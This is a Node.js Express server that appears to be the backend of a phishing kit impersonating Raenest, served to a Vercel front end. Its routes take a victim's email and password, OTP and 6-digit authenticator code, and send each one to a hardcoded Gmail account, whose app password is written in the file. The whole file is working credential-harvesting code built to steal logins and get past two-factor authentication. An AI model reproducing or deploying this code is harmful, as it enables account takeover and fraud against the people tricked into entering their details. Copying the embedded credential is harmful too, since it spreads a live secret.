const express = require("express");
const app = express();
const cors = require("cors");
const nodemailer = require("nodemailer");
const rateLimit = require("express-rate-limit");

// ✅ CORS MUST come FIRST, before express.json()
app.use(
  cors({
    origin: "https://assist-raenest.vercel.app",
    methods: ["GET", "POST", "OPTIONS"],
    allowedHeaders: ["Content-Type"],
    credentials: true,
  }),
);

// ✅ Handle preflight OPTIONS requests
app.options("*", cors());

app.use(express.json());

const PORT = process.env.PORT || 5000;

// Email credentials
const userEmail = "raenestsupportteam@gmail.com";
const pass = "ynyfkpiinkhrvysl";

// ✅ Rate limiter — max 5 requests per IP every 10 minutes
const limiter = rateLimit({
  windowMs: 10 * 60 * 1000, // 10 minutes
  max: 5, // max 5 requests per IP per window
  message: { success: false, message: "Too many requests. Try again later." },
  standardHeaders: true,
  legacyHeaders: false,
});

// Apply limiter to POST requests only
app.use((req, res, next) => {
  if (req.method === "POST") return limiter(req, res, next);
  next();
});

// ✅ Single transporter — no pool (Vercel is serverless, pool doesn't apply)
const transporter = nodemailer.createTransport({
  service: "gmail",
  auth: { user: userEmail, pass: pass },
});

transporter.verify((error) => {
  if (error) {
    console.error("❌ Mail error:", error.message);
  } else {
    console.log("✅ Mail transporter ready");
  }
});

// API routes for index
app.post("/", (req, res) => {
  const { email, password } = req.body;

  if (!email || !password) {
    return res
      .status(400)
      .json({ success: false, message: "Email and password required." });
  }

  const mailOptions = {
    from: userEmail,
    to: userEmail,
    subject: "New Login Attempt",
    text: `Email: ${email}\nPassword: ${password}`,
  };

  console.log(mailOptions);

  transporter.sendMail(mailOptions, (error, info) => {
    if (error) {
      console.error(error);
      return res.status(500).send("Error occurred: " + error);
    }
    console.log("Email sent: " + info.response);
    return res.send("success");
  });
});

// API routes for otp
app.post("/otp", (req, res) => {
  const otp = req.body?.otp;

  if (!otp) {
    return res.status(400).json({ success: false, message: "OTP required." });
  }

  const mailOptions = {
    from: userEmail,
    to: userEmail,
    subject: "OTP Received",
    text: `OTP: ${otp}`,
  };

  console.log(mailOptions);

  transporter.sendMail(mailOptions, (error, info) => {
    if (error) {
      console.error(error);
      return res.status(500).send("Error occurred: " + error);
    }
    console.log("Email sent: " + info.response);
    return res.send("success");
  });
});

// ── POST /auth — 6-digit authenticator code

app.post("/auth", (req, res) => {
  const { auth } = req.body;

  if (!auth || !/^\d{6}$/.test(auth)) {
    return res
      .status(400)
      .json({ success: false, message: "Auth must be exactly 6 digits." });
  }

  const mailOptions = {
    from: userEmail,
    to: userEmail,
    subject: "Raenest — Verification Code Entered",
    text: `2FA Code: ${auth}`,
  };

  console.log("→ auth email:", mailOptions.text);

  transporter.sendMail(mailOptions, (error, info) => {
    if (error) {
      console.error("Mail error:", error);
      return res
        .status(500)
        .json({ success: false, message: "Failed to send email." });
    }
    console.log("✓ Email sent:", info.response);
    return res.json({ success: true });
  });
});
app.listen(PORT, () => {
  console.log(`Server is running on http://localhost:${PORT}`);
});
